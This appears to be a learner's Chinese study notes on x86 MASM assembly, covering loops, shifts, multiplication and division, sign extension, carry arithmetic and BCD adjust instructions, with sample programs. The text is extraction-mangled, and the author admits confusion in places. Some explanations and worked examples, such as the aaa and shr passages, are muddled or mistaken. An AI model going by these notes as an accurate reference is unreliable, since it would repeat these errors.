文件定义;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.lib;对于上面的lib,inc还不是很理解;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 数据段.dataszCaption\tdb\t&#x27;Dqx-Gh0st&#x27;,0szText1 db\t&#x27;I&#x27;,0szText2 db\t&#x27;Love&#x27;,0szText3 db\t&#x27;You&#x27;,0szText4 db\t&#x27;Deeply&#x27;,0fuck db\t&#x27;fuck&#x27;,0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;var\tdd\t20;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 代码段.code;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; start: xor\teax,eax mov eax,5 .while\teax&gt;0 .if eax==4 dec eax .continue ;continue后面的代码是不会执行的,可以对比一下C语言 push eax invoke\tMessageBox,NULL,offset fuck,offset szCaption,MB_OK pop eax ;前面好像说过,函数的返回值一般在eax,所以这里的eax我们要保持不变 .elseif eax==3 push eax invoke\tMessageBox,NULL,offset szText1,offset szCaption,MB_OK pop eax dec eax .elseif eax==2 .break .else dec eax .endif .endw ;do &#123;&#125;while(eax&gt;0) mov eax,2 .repeat push eax invoke\tMessageBox,NULL,offset szText2,offset szCaption,MB_OK pop eax dec eax .until\teax == 0 mov ecx,2 .repeat pushad invoke\tMessageBox,NULL,offset szText3,offset szCaption,MB_OK popad .untilcxz push 0 call ExitProcess;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ​ 把上面的代码转化一下 ​ 1234567891011121314mov eax,2.repeat push eax\tinvoke\tMessageBox,NULL,offset szText2,offset szCaption,MB_OK\tpop eax\tdec eax.until\teax == 0i=0;do&#123;\tprintf(&quot;xxx&quot;);&#125;while(i!=0) ​ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;汇编mov eax,5.while\teax&gt;0\t.if eax==4 dec eax .continue ;continue后面的代码是不会执行的,可以对比一下C语言 push eax invoke\tMessageBox,NULL,offset fuck,offset szCaption,MB_OK pop eax ;前面好像说过,函数的返回值一般在eax,所以这里的eax我们要保持不变 .elseif eax==3 push eax invoke\tMessageBox,NULL,offset szText1,offset szCaption,MB_OK pop eax dec eax\t.elseif eax==2 .break\t.else dec eax\t.endif.endw;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;C语言i=5;for(i=5;i&gt;0;)&#123;\tif(i==4)\t&#123; i--; continue; sub();\t&#125;\telse if(i==3)\t&#123; printf(&quot;xxx&quot;); i--;\t&#125;\telseif(i==2) breakl;\telse i--;&#125; movsx&#x2F;movzx 符号扩展123mov cl,66mov ax,0mov al,cl 这样就实现了cl到ax的变化 但是有个问题,如果cl是负数呢?我们 123mov cl,0xf0mov ax,0xffffmov al,cl 这会很麻烦 movsx eax,cl 无论cl是正是负.eax都会跟着cl的符号 movzx eax,cl 就不会有符号的跟随 零扩展&#x2F;符号扩展如果你是正数,就把你的二进制高位全部置为0 如果你是负数,就把你的二进制高位全部置为1, 这样扩展不会改变原来的值 它不会要求你的长度怎么怎么样 只要长度左边&gt;=右边就可以,它会把右边的数据自动的长度扩展 movzx只用于无符号的数据,但是这句话不太明白 书上的例子mov bx,0A69B,也没有指明后者是正数还是负数 整数运算AND&#x2F;OR&#x2F;NOT&#x2F;XOR&#x2F;TEST在移位的时候,你的左移和右移是和有无符号相关的 所以这回是一个细节 简介AND 对1没影响,对0会得0 所以AND可以 用1去AND,那个数,可用于检测,如果对方是1那么结果是1,如果不是就为0 用0去AND,结果只会是0, 用0去or那个数,那个数不会发生任何改变,用于保存某些位的数 用1去or,结果只能是1 NOT 是取反 XOR 异或 如果2个数相同就不相异,结果为0 如果2个数不相同就相异,结果为1 TEST 不会修改操作数,相当于AND 会影响ZF&#x2F;SF&#x2F;PF 映射集补集用NOT 交集用AND,对于2个操作数,如果有都有1,那就1,否则就是0 并集用OR,只要有一个人有就可以了 neg求补码 neg求的是有符号的数据 如果结果无法放入寄存器,就补码无效,也就是OF&#x3D;1,就neg无效 好比数据-128 12345xor eax,eaxmov al,-128neg almov al,-60neg al 第一次neg al=128,of=1,neg无效,al不发生变化,al还是原来的-128 第二次neg al&#x3D;-60,neg后al&#x3D;60,of&#x3D;0,neg成功 &#x3D;&#x3D;neg&#x3D;&#x3D;可以用来取相反数 shl&#x2F;shr1234mov ax,0mov al,11001100bmov cl,1shl al,cl// shl实际左移的位数是n%32 如果左移1位, 可以shl al,1 如果左移&gt;1位,必须用cl保存左移的位数,cl也可以是1[^这是8086的说法] 左移会存在数据的进位,进位的保存会在CF中 1234mov ax,0mov al,11000001bmov cl,1shr al,cl 如果右移1位, 可以shl al,1 如果右移&gt;1位,必须用cl保存左移的位数,cl也可以是,[^8086的说法] 右移会存在数据的移除,消失的最后一位会在CF中- 计算100*36 12345mov\teax,100mov\tebx,eaxshl\teax,5shl\tebx,2add\teax,ebx 它的原理分配法 100x36&#x3D;100x(32+4) sal&#x2F;sar就算数左移的话,与逻辑左移没有什么区别,都是填充0 就是右移就有些不同 10001000b是负数,逻辑右移后01000100b是正数,符号的性质发生了改变 于是我们就要用到算数右移了 10001000b用sar后11000100b,结果还是负数 sar 右移&gt;32位的话,实际右移的位数是n%32 ROL&#x2F;ROR 后进位循环移动什么意思? 好比10101111b用指令 123mov al,1010 1111brol al,4al= 1111 1010b 左移动4位,每移动一位,CF就记录那个值,然后在右边补上 它的用处? ①.位组交换 它可以交换一个8bit的前4位和后4位 ②.坑 我们都知道一位的16进制对应了4位的二进制 于是左移一位16进制就是左移4位二进制 于是把数据 12345mov ax,6A4Bhrol ax,4rol ax,4rol ax,4rol ax,4 于是到了最后ax的值没有发生变化 RCL&#x2F;RCR 先进位循环移动与上面的原理一样 不一样的地方在于 它有CF的初始化值,移动后,先用已经初始化的CF取填充,再去记录那个移动的值 1234STC\t;CF=1mov\tcl,4mov\tal,10010010brcl\tal,4 1最后AL=00101100 为了做一个对比 1234STCmov\tcl,4mov\tal,10010010brol\tal,4 于是最后 1al= 00101001 SHLD&#x2F;SHRD第一个操作数是16位&#x2F;32位的寄存器或者内存单元 第二个操作数只能是寄存器 第三个操作数可以使CL或者立即数 12SHLD D,S,countSHRD D,S,count count啥意思?就是移多少位 SHLD D,S,count 把D左移coutn位,用S的高coutn位填充D的低count位 好比 shld 0x9BA6,0xAC36,4 4位就是16进制的一个数字 最后的0x9BA6-&gt;0xBA60-&gt;0xBA6A SHRD D,S,count 把D右移count位 用S的低count为去填充D的高count为 好比 shrd 0x234B,0x7654,4 0x2345-&gt;0x0234-&gt;0x4234 mul 乘法指令由于目的操作数是被乘数和乘数大小的两倍，因此不会发生溢岀。 8bit类型 AL*1Byte 因数1是AL 因数2是一个8位的数据 其结果默认存放在AX中 16bit类型 AX*1word 因数1是AX 因数2是一个16位的数据 其结果默认存放 低16位 AX 高16位 DX 上面是8086机学到的,可以兼容32位 32bit 数据长度 因数1 因数2 结果 8位 al bl&#x2F;byte ptr ds:[si] AX 16位 ax bx&#x2F;word ptr ds:[si] DX:AX 32位 eax EDX:EAX 什么时候高位会产生数据?对于无符号的数据来说,数据太大就进位 所以才会有高位的寄存器,当高位寄存器!&#x3D;0,那么CF&#x3D;1,表示进位了 好比这一段代码 1234567891011121314151617data segment db 5,4,3,2,1,0 data ends mov ax,0 mov bx,0 mov al,2 mov bl,3 mul bl mul byte ptr ds:[1] mov ax,2 mov bx,10 mul bx mul word ptr ds:[0] IMUL 指令 有符号的乘法IMUL有3种语法 1个操作数&#x2F;2个操作数&#x2F;3个操作数 对于无符号的数据,好比 123mov al,48mov\tbl,4imul\tbl 48*4&#x3D;192 192&gt;127溢出 192&lt;255不会进位,但是就离谱的CF&#x3D;1 其实我还是没有分清IMUL与MUL到底有什么区别…. 难道说他会有一个mul的有符号填充??? 一个操作数 1234mov al,10mov bl,20IMUL blax=al*bl 两个操作数 123mov ax,10IMUL ax,20ax=ax*20 三个操作数 12imul cx,ax,bx//cx=ax*bx DIV 除法指令24&#x2F;9&#x3D;2…6 被除数24 除数9 商2 余数6 被除数 被除数位置 除数 除数位置 商 余数 16bti AX 8位 8bit的内存单元&#x2F;寄存器 AL AH 32bit DX:AX 16位 16bit的内存单元&#x2F;寄存器 AX DX 64bit EDX:EAX 32位 32bit的内存单元&#x2F;寄存器 EAX EDX IDIV 有符号除法与DIV的区别在于,IDIV要进行符号的扩张 也就是DX&#x2F;EDX会根据AX&#x2F;EAX的正负进行有无符号的填写 其余无区别了 123456789101112131415161718192021222324252627282930 .386 .model flat,stdcall option casemap:none\t.data\tx\tsword\t-101\t.codestart: xor\tedx,edx xor\teax,eax mov\tdx,0 mov\tax,x mov\tbx,2 idiv\tbx ;用DIV是一样的 ;=-51...1 xor\tedx,edx xor\teax,eax mov\tdx,0 mov\tax,x cwd mov\tbx,2 idiv\tbx ;=-50...-1 END start 很奇怪 cbw&#x2F;cwd&#x2F;cdq&#x2F;cdqe&#x2F;cwde符号扩展cbw\t;扩展到了AH,用AL的符号填充AH,AH的值会被覆盖 若al&#x3D;78h,cbw后ax&#x3D;78h 若al&#x3D;87h,cbw后ax&#x3D;ff87h cwd\t;扩展到了DX,用AX的符号填充DX, DX的值会被覆盖 cwde AX-&gt;EAX cdq\t;扩展到了EDX,用EAX的符号填充EDX,EDX的值会被覆盖 cdqe EAX-&gt;RAX 为什么要符号扩展???? 做8位除法,被除数必须16位AX 做16位除法,被除数必须32位DX|AX 做32位除法,被除数必须64位EDX|EAX 123456789101112131415161718192021222324252627282930 .386 .model flat,stdcall option casemap:none\t.data .codestart: xor\tedx,edx xor\teax,eax mov\tah,0 mov\tal,-48 mov\tbl,5 idiv\tbl ;-48(208)/5=40..3 xor\tedx,edx xor\teax,eax mov\tah,0 mov\tal,-48 cbw ;让ah=FF mov\tbl,5 idiv\tbl ;-48/5=-9..-3; END start 不用就会产生错误的解决方案 1234567891011121314151617181920212223242526 .386 .model flat,stdcall option casemap:none\t.data\tx\tsword\t-101\t;=0x9b,-101一定是负数,但是0x9b却不是\t.codestart: xor\tedx,edx xor\teax,eax ;mov\tal,9bh,al一定是负数 mov\tal,-101 cbw\t;扩展到了AH ;mov\tax,9bh,ax不是负数,cwd失效 mov\tax,-101 cwd\t;扩展到了dx ;mov\teax,9bh,eax不是是负数,cdq失效 mov\teax,-101 cdq\t;扩展到了edx END start adc 进位加法adc实现了带有符号位的加法,建立在二进制位的那个符号 adc eax,dword ptr [esi] 等价于 eax=eax+dword ptr [esi]+CF adc的优势体现在哪???? 好比1234+4567 我们可以这样算 34+67&#x3D;01,本来是101,但是进位了1 然后 12+45&#x3D;57,于是加上进位,就是58 最后的结果就是5801 通过这种分割的形式我们可以算很长的数据 下面是一个8字节程度的数据,实现加法 好比0x1234567890102345+0x1234567890102345 这个代码你还还是多看一下,很妙 12345678910111213141516171819202122232425262728 .386 .model flat,stdcall option casemap:none\t.dataarr1\tdw\t12h,34h,56h,78h,9harr2\tdw\t9h,87h,65h,43h,21h\t.codestart: mov esi,offset arr1 mov edi,offset arr2 mov ecx,5 xor eax,eax clc ;clc指令把CF寄存器初始化为0,给首位adc使用\tok: mov ax,[esi] adc [edi],ax pushfd add esi,2 add edi,2 popfd ;为什么把寄存器入栈?因为add会修改CF寄存器的值 loop ok END start sbb 借位减法 就是一个借位的过程,做一些记录 123456xor\teax,eaxmov\tedx,7mov\teax,1sub\teax,2sbb\tedx,0 xadd 很sb的加法z&#x3D;x+y xadd的效果就是 z&#x3D;y+x 在我的电脑上,这个指令无法用 非压缩10进制算法原理aaa 加法会影响AF&#x2F;CF 通俗介绍 aaa 操作的对象16进制的个位数,也就是4个bit位 好比0x2F,他会把F拿出来,然后把F分解为1和5,因为F是15 好比0x39,ASCII是9,然后把9分解为0和9,也就是9 于是下面这些例子 3+’6’&#x3D;0x39,然后对个位数可以转化为0和9,依次放在ah,al ‘3’+’6’&#x3D;0x69,然后对个位数可以转化为0和9 因为它只看个位数,同时请保证AH&#x3D;0,再进行操作 16进制个位数满足0-15,对于10进制绰绰有余, AH代表了进位,会传递给一个进位者 书上说 如果AL的低4位&gt;9,也就数10进制进位了AL+&#x3D;6,AH+&#x3D;1…..是吗?????&#x2F; 会有CF&#x3D;1,AF&#x3D;1 否则CF&#x3D;0.AF&#x3D;0. 难道会有置空? 关于计算过程好比0x37&#x3D;0x39 也就是7+9&#x3D;0x70 你可以看到低4字节为0 但是他有一个进位 CF&#x3D;1,AF&#x3D;1 就相当于0x10&#x3D;16了 例子12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.incprintf proto c:dword,:vararg;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .datax db &quot;96543&quot; y db &quot;53279&quot; sum db (sizeof x + 1) dup(&#x27;0&#x27;),0format db &quot;%s&quot;,0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart: xor\tecx,ecx xor\teax,eax ;为什么esi-1 ;因为从0开始计数,所以最后一位的index=len-1 ;为什么edi不-1? ;edi本来就比esi长一个字节,好比x是4字节,那么sum就5字节,会有进位 mov\tesi,sizeof x -1 mov\tedi,sizeof x mov\tecx,sizeof x ;数值的填充由字符串最高位开始==数值最低位开始 ;让进位值由bh来装,最先的进位还是0 mov\tbh,0 L1: ;aaa指令要求ah=0 mov\tah,0 mov\tal,x[esi] ;al每一次先加上进位值,再加上数值 add\tal,bh aaa add\tal,y[esi] aaa ;+了后,bh还要保持新的进位 mov\tbh,ah or\tal,30h ;转ascii然后放入sum mov\tsum[edi],al dec\tesi dec\tedi loop\tL1 ;最后一个也可能有进位 or\tbh,30h mov\tsum[edi],bh invoke\tprintf,addr format,addr sum invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart 又写了一遍 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.incprintf proto c:dword,:vararg;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .datax db &quot;96543&quot;,0 y db &quot;53279&quot;,0 sum db sizeof x dup(0),0format db &quot;%s&quot;,13,0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart: xor\tecx,ecx xor\teax,eax ;为什么esi-1 ;因为从0开始计数,所以最后一位的index=len-1 ;为什么edi不-1? ;edi本来就比esi长一个字节,好比x是4字节,那么sum就5字节,可能会有进位 mov\tesi,sizeof x - 2 mov\tedi,sizeof x - 1 mov\tecx,sizeof x - 1 ;数值的填充由字符串最高位开始==数值最低位开始 clc L1: mov\tah,0 mov\tal,x[esi] adc\tal,y[esi] aaa pushfd or\tal,30h popfd mov\tsum[edi],al dec\tesi dec\tedi loop\tL1 cmp ah,1 jnz over or ah,30h mov\tsum[edi],ah over: invoke\tprintf,addr format,addr sum invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart or,add,会影响CF inc&#x2F;dex不会 daa 加法影响AF&#x2F;CF&#x2F;PF&#x2F;SF&#x2F;ZF 书上说其调整规则 若AL的低4位有进位,则AF&#x3D;1,AL+&#x3D;6, 若AL的高4位有进位,则CF&#x3D;1,AL+&#x3D;60h, 都不成立就AF&#x3D;CF&#x3D;0 他把16进制的0x12 可以转化为10进制的0x12 12345xor\teax,eaxmov\tal,12hadd\tal,28hdaa 12+28&#x3D;40, 最后的结果是16进制的40 1234567891011121314151617181920212223242526272829303132333435363738394041424344;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include windows.incinclude kernel32.incincludelib\tkernel32.lib;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .dataNum1 WORD 4536hNum2 WORD 7207hsum DWORD ?;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart:\txor\teax,eax\tmov\tsum,0\tmov\tesi,0\tmov\tecx,type Num1\tCLC ok:\tmov\tal,byte ptr Num1[esi]\tadd\tal,byte ptr Num2[esi]\tdaa mov\tbyte ptr sum[esi],al\tinc\tesi\tloop\tok\tadc\tbyte ptr sum[esi],0\tmov\teax,sum\tinvoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\tend\tstart 关于进位的情况 123mov\tal,56hadd\tal,92hdaa 56+92&#x3D;148 al装不下148,只能装48 所以就进位了 aas 减法影响AC&#x2F;CF 它操作的对象也是16进制 好比操作0xF,就是操作15 然后得到10进制意义的数值 可以类比aaa 书上说 如果AL的低4位&gt;9,也就数10进制借位了AL-&#x3D;6,AH-&#x3D;1…..是吗?????&#x2F; 会有CF&#x3D;1,AF&#x3D;1 否则CF&#x3D;0.AF&#x3D;0. 难道会有置空? 例子1234567891011mov\tah,0mov\tal,5sub\tal,10pushfadd\tal,30hpopf;or会影响CFaas 0-5&#x3D;FB 然后aas后 AH&#x3D;0xFF,AL&#x3D;5 可能AH代表了符号,AL代表了值 其中产生的借位留在了CF中 das 减法影响AF&#x2F;CF&#x2F;PF&#x2F;SF&#x2F;ZF\\ 书上说其调整规则 若AL的低4位有进位,则AF&#x3D;1,AL+&#x3D;6, 若AL的高4位有进位,则CF&#x3D;1,AL+&#x3D;60h, 都不成立就AF&#x3D;CF&#x3D;0 例子对16进制形式操作 结果也是10进制意义的16进制 1234567start:\txor\teax,eax\txor\tebx,ebx\tmov\tal,85h\tmov\tbl,48h\tsub\tal,bl\tdas 结果是10进制意义16进制的85-48&#x3D;37 对于负数的处理 123mov\tal,50hsub\tal,90hdas 其实这里的借位我算是见过了 诸如的结果60h 怎么来的 150-90&#x3D;60 所以就60h aam 乘法会影响PF&#x2F;SF&#x2F;ZF ascii adjust after mul 操作的对象是16进制 得到结果是10进制,分别放在AH,AL AH&#x3D;AL&#x2F;10 AL&#x3D;AL%10 话不多说 12345mov\tah,0mov\tal,5mov\tbl,6\tmul\tblaam 然后结果就是30 ah&#x3D;03,al&#x3D;00 如果结果是98.AH&#x3D;09h.AL&#x3D;08h 如果结果是125.AH&#x3D;12h.AL&#x3D;05h 就像aaa的那个程序一样 aad 除法会影响PF&#x2F;SF&#x2F;ZF 它很不一样 操作的是10进制,从AH,Al当中取数据 AL&#x3D;AH*10+AL AH&#x3D;0 好比0x0207 就是操作10进制的27 在Al中生成商,在AH中生存余数 ,可是数据太多怎么办????? 12345mov\tax,0307haad;合成了数值37=0x某某mov\tbl,5div\tbl 他可以识别ax&#x3D;0x307位10进制的的37 于是想要使用aad的话,你得是10进制的形式然后被识别为16进制 好比你把一串ASCII-0x30,然后放在AH,AL中 “1234” 识别为,1,2,3,4然后除法?????woc????&#x2F;貌似不行的 字符串基本指令 指令 说明 MOVSB、MOVSW、MOVSD 传送字符串数据： ESI的内存数据—&gt; EDI 的内存位置 CMPSB、CMPSW、CMPSD 比较字符串：比较分别由 ESI 和 EDI 寻址的内存数据 SCASB、SCASW、SCASD 扫描字符串：比较累加器 (AL、AX 或 EAX) 与 EDI 寻址的内存数据 STOSB、STOSW、STOSD 保存字符串数据：将累加器内容保存到 EDI 寻址的内存位置 LODSB、LODSW、LODSD 